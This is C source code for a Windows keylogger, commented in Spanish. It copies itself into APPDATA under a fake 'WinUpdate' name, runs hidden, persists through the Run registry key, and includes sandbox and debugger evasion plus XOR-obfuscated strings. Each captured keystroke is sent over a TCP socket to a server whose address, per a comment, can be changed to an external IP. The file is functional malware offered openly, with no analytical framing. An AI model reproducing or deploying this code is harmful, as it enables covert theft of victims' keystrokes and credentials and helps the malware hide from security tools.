#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <tchar.h>


void SelfReplicateWithName(const char *newName) {
    char originalPath[MAX_PATH];
    GetModuleFileName(NULL, originalPath, MAX_PATH);

    // Si esta es la versión clonada, no replicar otra vez (bucle infinito y no funciona en windows)
    if (strstr (originalPath, newName) != NULL) return;

    char newPath[MAX_PATH];
    GetEnvironmentVariable("APPDATA", newPath, MAX_PATH);
    strcat(newPath, "\\");
    strcat(newPath, newName);


    // Solo copiar si no existe
    if (GetFileAttributes(newPath) != INVALID_FILE_ATTRIBUTES) DeleteFile (newPath);

    CopyFile(originalPath, newPath, FALSE);

    // Ejecuta la copia
    ShellExecute(NULL, "open", newPath, NULL, NULL, SW_HIDE);

    // ================== [ Añadir al inicio de Windows ] ==================
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueEx(hKey, "WinUpdate", 0, REG_SZ, (BYTE *)newPath, strlen(newPath));
        RegCloseKey(hKey);
    }

    // Sale del original
    ExitProcess(0);

}

// ================== [ Anti-debugging y sandbox evasion ] ==================

BOOL IsDebuggerAttached() {
    return IsDebuggerPresent() || CheckRemoteDebuggerPresent(GetCurrentProcess(), NULL);
}

BOOL IsSandboxed() {
    // Requiere al menos 2 núcleos y > 1GB RAM (común en sistemas reales)
    SYSTEM_INFO sysInfo;
    MEMORYSTATUSEX memInfo = {0};
    memInfo.dwLength = sizeof(memInfo);

    GetSystemInfo(&sysInfo);
    GlobalMemoryStatusEx(&memInfo);

    DWORD numCores = sysInfo.dwNumberOfProcessors;
    DWORDLONG totalPhysMem = memInfo.ullTotalPhys;

    return (numCores <= 1 || totalPhysMem < (1024LL * 1024 * 1024));  // < 1 GB
}

BOOL HasUserInteracted() {
    // Verifica si el usuario ha movido el ratón
    POINT p1, p2;
    GetCursorPos(&p1);
    Sleep(5000);  // espera 5 segundos
    GetCursorPos(&p2);
    return (p1.x != p2.x || p1.y != p2.y);
}

// ================== [ Cadenas cifradas con XOR ] ==================

void xor_decrypt(char* str, char key) {
    while (*str) {
        *str ^= key;
        str++;
    }
}

void SendKeyToServer(const char *keyStr) {
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;


    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) return;


    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s == INVALID_SOCKET) {
        WSACleanup();
        return;
    }


    server.sin_addr.s_addr = inet_addr("127.0.0.1");  // Cambiar por IP externa si quieres
    server.sin_family = AF_INET;
    server.sin_port = htons(9001);  // Puerto del servidor Python


    if (connect(s, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
        closesocket(s);
        WSACleanup();
        return;
    }


    send(s, keyStr, strlen(keyStr), 0);


    closesocket(s);
    WSACleanup();
}

// ================== [ Código principal del keylogger ] ==================

int main() {

    SelfReplicateWithName("aaawinupdate.exe");

    // ================== [ Técnica 8 - Ejecución retardada ] ==================
    Sleep(15000); // Delay inicial para evadir sandbox de análisis rápido (30 segundos)

    // ================== [ Técnica 5 - Anti-debugging ] ==================
    if (IsDebuggerAttached()) {
        // return 0;
    }

    // ================== [ Técnica 4 - Evasión de entornos sandbox ] ==================
    if (IsSandboxed() || !HasUserInteracted()) {
        // return 0;
    }

    // ================== [ Técnica 3 - Entropía anómala (relleno de basura) ] ==================
    char noise[] = "jdhf8723r8723r9283rh28hfhsd8hf23h823"; // solo para aumentar entropía
    volatile int dummy = 0;
    for (int i = 0; i < sizeof(noise); i++) {
        dummy += noise[i];
    }

    SHORT keyState[256] = {0};

    // Cadena cifrada con XOR (clave 0x2A)
    char enc_filename[] = { 'l'^0x2A, 'o'^0x2A, 'g'^0x2A, '.'^0x2A, 't'^0x2A, 'x'^0x2A, 't'^0x2A, '\0' };
    xor_decrypt(enc_filename, 0x2A);  // Descifra antes de usar

    while (1) {
        for (int key = 8; key <= 255; key++) {
            SHORT isDown = GetAsyncKeyState(key) & 0x8000;


            if (isDown && !keyState[key]) {
                char buffer[32] = {0};


                if ((key >= 32 && key <= 126)) {
                    snprintf(buffer, sizeof(buffer), "%c", key);
                } else {
                    switch (key) {
                        case VK_RETURN: strcpy(buffer, "[ENTER]"); break;
                        case VK_BACK: strcpy(buffer, "[BACKSPACE]"); break;
                        case VK_TAB: strcpy(buffer, "[TAB]"); break;
                        case VK_SHIFT: strcpy(buffer, "[SHIFT]"); break;
                        case VK_CONTROL: strcpy(buffer, "[CTRL]"); break;
                        case VK_ESCAPE: strcpy(buffer, "[ESC]"); break;
                        case VK_SPACE: strcpy(buffer, " "); break;
                        default: snprintf(buffer, sizeof(buffer), "[%d]", key); break;
                    }
                }


                SendKeyToServer(buffer);
            }


            keyState[key] = isDown;
        }


        Sleep(10);
    }


    return 0;
}
